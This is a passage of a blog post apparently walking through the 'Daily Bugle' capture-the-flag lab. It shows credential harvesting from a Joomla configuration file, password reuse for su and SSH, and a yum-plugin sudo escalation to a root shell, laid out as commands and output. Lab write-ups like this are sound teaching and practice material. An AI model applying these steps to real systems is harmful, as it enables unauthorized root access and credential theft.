+/var/www/html/libraries/joomla/log/logger/database.php:                 <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="nv">$this</span>-&gt;password,
+
+&lt;snip&gt;
+</code></pre></div></div> <p><br> From the results of the peas, there appears to be a juicy configuration file.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>jjameson@dailybugle beez3]<span class="nv">$ </span><span class="nb">cat</span> /var/www/html/configuration.php
+<span class="nb">cat</span> /var/www/html/configuration.php
+&lt;?php
+class JConfig <span class="o">{</span>
+        public <span class="nv">$offline</span> <span class="o">=</span> <span class="s1">'0'</span><span class="p">;</span>
+        public <span class="nv">$offline_message</span> <span class="o">=</span> <span class="s1">'This site is down for maintenance.&lt;br /&gt;Please check back again soon.'</span><span class="p">;</span>
+        public <span class="nv">$display_offline_message</span> <span class="o">=</span> <span class="s1">'1'</span><span class="p">;</span>
+        public <span class="nv">$offline_image</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+        public <span class="nv">$sitename</span> <span class="o">=</span> <span class="s1">'The Daily Bugle'</span><span class="p">;</span>
+        public <span class="nv">$editor</span> <span class="o">=</span> <span class="s1">'tinymce'</span><span class="p">;</span>
+        public <span class="nv">$captcha</span> <span class="o">=</span> <span class="s1">'0'</span><span class="p">;</span>
+        public <span class="nv">$list_limit</span> <span class="o">=</span> <span class="s1">'20'</span><span class="p">;</span>
+        public <span class="nv">$access</span> <span class="o">=</span> <span class="s1">'1'</span><span class="p">;</span>
+        public <span class="nv">$debug</span> <span class="o">=</span> <span class="s1">'0'</span><span class="p">;</span>
+        public <span class="nv">$debug_lang</span> <span class="o">=</span> <span class="s1">'0'</span><span class="p">;</span>
+        public <span class="nv">$dbtype</span> <span class="o">=</span> <span class="s1">'mysqli'</span><span class="p">;</span>
+        public <span class="nv">$host</span> <span class="o">=</span> <span class="s1">'localhost'</span><span class="p">;</span>
+        public <span class="nv">$user</span> <span class="o">=</span> <span class="s1">'root'</span><span class="p">;</span>
+        public <span class="nv">$password</span> <span class="o">=</span> <span class="s1">'nv5uz9r3ZEDzVjNu'</span><span class="p">;</span>
+
+&lt;snip&gt;
+</code></pre></div></div> <p>Use the password from the configuration file to su into the jjameson user.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;bash-4.2<span class="nv">$ </span>su jjameson
+su jjameson
+Password: nv5uz9r3ZEDzVjNu
+
+<span class="o">[</span>jjameson@dailybugle beez3]<span class="err">$</span>
+</code></pre></div></div> <p><br> SSH into the machine just so we can get a better shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/thm/bugle]
+└─<span class="nv">$ </span>ssh jjameson@10.10.167.104                  
+jjameson@10.10.167.104<span class="s1">'s password: 
+Last login: Tue Feb 18 09:26:04 2025
+[jjameson@dailybugle ~]$
+</span></code></pre></div></div> <p><br> Run sudo -l to get a list of commands that our user can run as sudo.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/thm/bugle]
+└─<span class="nv">$ </span>ssh jjameson@10.10.167.104                  
+jjameson@10.10.167.104<span class="s1">'s password: 
+Last login: Tue Feb 18 09:26:04 2025
+[jjameson@dailybugle ~]$ sudo -l
+Matching Defaults entries for jjameson on dailybugle:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
+    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User jjameson may run the following commands on dailybugle:
+    (ALL) NOPASSWD: /usr/bin/yum
+</span></code></pre></div></div> <p><br> Check the GTFOBins for the yum.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/bugle/gtfobins.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="GTFO Bins" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Follow the steps in the GTFO Bins to escalate to root.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>jjameson@dailybugle ~]<span class="nv">$ TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-d</span><span class="si">)</span>
+<span class="o">[</span>jjameson@dailybugle ~]<span class="nv">$ </span><span class="nb">cat</span> <span class="o">&gt;</span><span class="nv">$TF</span>/x<span class="o">&lt;&lt;</span><span class="no">EOF</span><span class="sh">
+&gt; [main]
+&gt; plugins=1
+&gt; pluginpath=</span><span class="nv">$TF</span><span class="sh">
+&gt; pluginconfpath=</span><span class="nv">$TF</span><span class="sh">
+&gt; EOF
+[jjameson@dailybugle ~]</span><span class="nv">$ </span><span class="sh">cat &gt;</span><span class="nv">$TF</span><span class="sh">/y.conf&lt;&lt;EOF
+&gt; [main]
+&gt; enabled=1
+&gt; EOF
+[jjameson@dailybugle ~]</span><span class="nv">$ </span><span class="sh">cat &gt;</span><span class="nv">$TF</span><span class="sh">/y.py&lt;&lt;EOF
+&gt; import os
+&gt; import yum
+&gt; from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+&gt; requires_api_version='2.1'
+&gt; def init_hook(conduit):
+&gt;   os.execl('/bin/sh','/bin/sh')
+&gt; EOF
+[jjameson@dailybugle ~]</span><span class="nv">$ </span><span class="sh">sudo yum -c </span><span class="nv">$TF</span><span class="sh">/x --enableplugin=y
+Failed to set locale, defaulting to C
+Loaded plugins: y
+No plugin match for: y
+sh-4.2#
+</span></code></pre></div></div> <p><br> Get the root.txt flag.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sh-4.2# <span class="nb">cat</span> /root/root.txt
+&lt;redacted&gt;
+sh-4.2# ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    <span class="nb">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
+    <span class="nb">link</span>/ether 02:17:f9:e3:8c:35 brd ff:ff:ff:ff:ff:ff
+    inet 10.10.167.104/16 brd 10.10.255.255 scope global dynamic eth0
+       valid_lft 2222sec preferred_lft 2222sec
+    inet6 fe80::17:f9ff:fee3:8c35/64 scope <span class="nb">link 
+       </span>valid_lft forever preferred_lft forever
+</code></pre></div></div> <p><br> Get the user.txt flag.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sh-4.2# <span class="nb">cat</span> /home/jjameson/user.txt
+&lt;redacted&gt;
+sh-4.2# ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    <span class="nb">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
+    <span class="nb">link</span>/ether 02:17:f9:e3:8c:35 brd ff:ff:ff:ff:ff:ff
+    inet 10.10.167.104/16 brd 10.10.255.255 scope global dynamic eth0
+       valid_lft 2182sec preferred_lft 2182sec
+    inet6 fe80::17:f9ff:fee3:8c35/64 scope <span class="nb">link 
+       </span>valid_lft forever preferred_lft forever
+</code></pre></div></div> </article> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> © Copyright 2025 Biscotti Diskette. Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?70d799092f862ad98c7876aa47712e20"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
+    addBackToTop();
+  </script> </body> </html>
